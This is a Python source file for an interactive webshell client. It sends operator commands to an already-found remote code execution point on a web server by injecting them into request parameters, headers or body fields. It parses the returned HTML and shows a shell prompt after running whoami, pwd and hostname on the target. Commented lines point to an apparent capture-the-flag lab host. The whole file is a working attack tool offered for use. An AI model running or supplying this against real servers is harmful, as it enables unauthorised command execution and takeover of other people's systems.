#!/usr/bin/python3
import argparse
import requests
import re
import logging
import readline

from bs4 import BeautifulSoup
from urllib.parse import parse_qs

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
METHOD_POST="POST"
METHOD_GET="GET"

def execute_command(url, method=METHOD_POST,params={}, headers={}, data={}):
    """
    Sends a request to the specified URL with the given parameters and headers.

    Args:
        url (str): The URL to send the request to.
        params (dict): The parameters to include in the request.
        headers (dict): The headers to include in the request.
        data (dict): the data of include in the request

    Returns:
        tuple: A tuple containing the HTTP status code and the content of the HTML response.

    Raises:
        requests.RequestException: If there is an error with the request.
        """

    # Log the start of the function
    logging.debug(f"Starting request to URL: {method} - {url} - {params} - {headers}")
    
    try:
        # Send the request to the server
        if method==METHOD_GET:
            response = requests.get(url, params=params, headers=headers, data=data, verify=False)
        elif method==METHOD_POST:
            response = requests.post(url, params=params, headers=headers, data=data, verify=False)


        # Log the HTTP status code
        logging.debug(f"Received HTTP status code: {response.status_code}")
        logging.debug(f"Received HTML content : {response.text}")

        # Return the HTTP status code and the content of the HTML response
        return response.status_code, response.text

    except requests.RequestException as e:
        # Log any errors that occur
        logging.error(f"An error occurred: {e}")
        raise

from bs4 import BeautifulSoup

def extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return, bs4_selector, regex):
    """
    Extracts the result from the command return in the given HTML content.

    Args:
        html_content (str): The HTML content to parse.
        str_valid_command_return (str): The substring indicating a valid command return.
        str_wrong_command_return (str): The substring indicating a wrong command return.
        bs4_selector (str): The BeautifulSoup selector to find the command result.

    Returns:
        tuple: A tuple containing a boolean indicating if the command was valid and the command result.
    """
    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')

    # Initialize variables to store the command result and validity
    cmd_result = ''
    valid_result = False

    # Check if the valid command return substring is in the HTML content
    if str_valid_command_return in html_content:
        valid_result = True

        # Use the BeautifulSoup selector to find the command result
        selector_tags = soup.select(bs4_selector)

        # Check if any tags were found and if there is at least one tag
        if selector_tags and len(selector_tags) > 0:
            # Get the text from the first tag and strip any surrounding whitespace
            cmd_result = selector_tags[0].get_text().strip()

            if regex is not None:
                try:
                    result_groups=re.search(regex, cmd_result).groups()
                    if len(result_groups) == 0:
                        print(f"Regex {regex} produced no match, will not be applied.")
                    elif len(result_groups) >1:
                        print(f"Regex {regex} produced more than 1 match, will only take first.")
                    cmd_result=result_groups[0]

                except Exception as e:
                    print(f"Regex {regex} produced an error, will not be applied.")
                

            # Check if multiple tags were found and print a warning message
            if len(selector_tags) > 1:
                print(f"->Selector {bs4_selector} returned multiple lines, consider choosing a more discriminating selector to return only one result.")
        else:
            # Print a message if no valid tag was found
            print(f"Success: No valid tag found for {bs4_selector}")

    # Check if the wrong command return substring is in the HTML content
    elif str_wrong_command_return in html_content:
        cmd_result = "Command forbidden"

    # Return the validity of the command and the command result
    return valid_result, cmd_result


def populate_template(cmd, temple_dict):
    """
    Remplace la chaîne "%cmd" dans les valeurs du dictionnaire temple_dict par la valeur de cmd.

    Args:
        cmd (str): La commande à insérer dans les valeurs du dictionnaire.
        temple_dict (dict): Un dictionnaire où les valeurs sont des chaînes de caractères.

    Returns:
        dict: Un nouveau dictionnaire avec les valeurs modifiées.

    Examples:
        >>> cmd = "example_command"
        >>> temple_dict = {
        ...     "key1": "This is a %cmd%",
        ...     "key2": "Another %cmd here",
        ...     "key3": "No command here"
        ... }
        >>> populate_template(cmd, temple_dict)
        {'key1': 'This is a example_command', 'key2': 'Another example_command here'}
    """
    populated_dict = {}

    for key, value in temple_dict.items():
        if "%cmd%" in value:
            new_value = value.replace("%cmd%", cmd)
        else:
            new_value = value
        populated_dict[key] = new_value

    return populated_dict

def populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex):
    # init returned variables
    valid_result=False
    cmd_result=""
    # Execute the command
    populated_params = populate_template(command, template_params)
    populated_headers = populate_template(command, template_headers)
    populated_data = populate_template(command, template_data)

    http_response, html_content = execute_command(url, method=method, params=populated_params, headers=populated_headers, data=populated_data)

    if html_content:
        valid_result, cmd_result = extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector, regex)
        # soup = BeautifulSoup(html_content, 'html.parser')
    else:
        valid_result, cmd_result= (False, "Command processed, but no specific condition met.")

    return valid_result, cmd_result


def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="html", method=METHOD_POST, template_params={}, template_headers={}, template_data={"command": "%cmd%"}, regex=None):
    """
    Main function to handle user input and process commands.
    """
    command_history = []
    command_index = 0
    
    # Parameters to process cmd returns
    str_valid_command_return=str_valid_command_return
    str_wrong_command_return=str_wrong_command_return
    bs4_selector=bs4_selector

    # Get the user name of the server and current working directory
    valid_result_whoami, user_name=populate_template_and_execute_commands("whoami", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
    valid_result_pwd, working_dir=populate_template_and_execute_commands("pwd", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
    valid_result_hostname, hostname=populate_template_and_execute_commands("hostname", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
    if not valid_result_whoami:
        user_name="swcli[fake]"
    if not valid_result_pwd:
        working_dir="/home/swcli[fake]"
    if not valid_result_hostname:
        hostname=url

    while True:
        try:
            # Display the prompt
            command = input(f"({user_name}@{hostname})-[{working_dir}]:\r\n$ ")


            # Exit condition
            if command.lower() == "exit":
                break

            # Add command to history
            if command_index < len(command_history):
                command_history = command_history[:command_index]
                command_history.append(command)
                command_index = len(command_history)

            # Execute the command
            valid_result, cmd_result= populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
            if cmd_result != "": # do not display empty line
                print(cmd_result)

        except KeyboardInterrupt:
            break

def parse_arguments():
    """
    Parses command-line arguments for the webshell script.

    Returns:
        argparse.Namespace: An object containing the parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Simple webshell client that tries to be agnostic of the found RCE. No need to upload a specific webshell to use this client.")

    # Add the URL argument
    parser.add_argument('--url', required=True, help='The URL of the webshell.')

    # Add the method argument
    parser.add_argument('--method', choices=['POST', 'GET'], required=True, help='The HTTP method to use (POST or GET).')

    # Add the selector argument
    parser.add_argument('--selector', required=True, help='A CSS-like selector to catch the return of the command result in the HTML returned page.')

    # Add the valid_cmd argument
    parser.add_argument('--valid_cmd', required=True, help='A string to find in the returned HTML page to validate that the command was properly executed.')

    # Add the wrong_cmd argument
    parser.add_argument('--wrong_cmd', required=True, help='A string to find in the returned HTML page to indicate that something went wrong in the webshell command.')

    # Add the -H argument, which can be specified multiple times
    parser.add_argument('-H', action='append', help='Add a header to the request as a string. Use %%cmd%% to inject the command. Example: "User-Agent=%%cmd%%"')

    # Add the -D argument, which can be specified multiple times
    parser.add_argument('-D', action='append', help='Add a body parameter to the request as a string. Use %%cmd%% to inject the command. Example: "command=%%cmd%%"')

    # Add the -P argument, which can be specified multiple times
    parser.add_argument('-P', action='append', help='Add a query parameter to the request as a string. Use %%cmd%% to inject the command. Example: "command=%%cmd%%"')

    # Add the --regex argument in order to specify a regex for the result of valid commands
    parser.add_argument('--regex', required=False, help='A regular expression to select text after applying the --selector switch, if null, no regex will be applyed.')
    
    # Parse the arguments
    args = parser.parse_args()

    return args

def parse_request_elements(list_of_string_representing_http_element):
    """
    Parses a list of string representations of HTTP elements (such as query parameters, headers, data in body) into a dictionary.

    Args:
       list_of_string_representing_http_element (list of str): A list of strings representing HTTP elements.

    Returns:
        dict: A dictionary where keys are the names of the HTTP elements and values are their corresponding values.
    """
    # Initialize an empty dictionary to store the parsed values
    values_as_dict = {}

    # Iterate over each string representation of an HTTP element in the input list
    for http_element in list_of_string_representing_http_element:
        # Parse the query string into a dictionary of lists
        captured_value=parse_qs(http_element).items()

         # Iterate over the key-value pairs in the parsed dictionary
        for key, value in parse_qs(http_element).items():
            # Store the first value in the dictionary (assuming single values)
            values_as_dict[key] = value[0]
    
    return values_as_dict



if __name__ == "__main__":
    # Parse the command-line arguments
    args = parse_arguments()

    # setting defaut value for None arguments
    if args.P is None:
        args.P={}
    if args.H is None:
        args.H={}
    if args.D is None:
        args.D={}

    url = args.url
    str_valid_command_return=args.valid_cmd
    str_wrong_command_return=args.wrong_cmd
    bs4_selector=args.selector
    method=args.method
    regex=args.regex

    template_params=parse_request_elements(args.P)
    template_headers=parse_request_elements(args.H)
    template_data=parse_request_elements(args.D)

    # str_valid_command_return="blue_boy_typing_nothought.gif"
    # str_wrong_command_return="Are you a hacker?"
    # bs4_selector='h2'
    # method=METHOD_POST
    # template_params={}
    # template_headers={}
    # template_data={"command": "%cmd"}

    # # url = input("Enter the URL:")
    # url = "http://10.10.244.7/secret/"
    main(url, str_valid_command_return, str_wrong_command_return, bs4_selector, method=method, template_params=template_params, template_headers=template_headers, template_data=template_data, regex=regex)
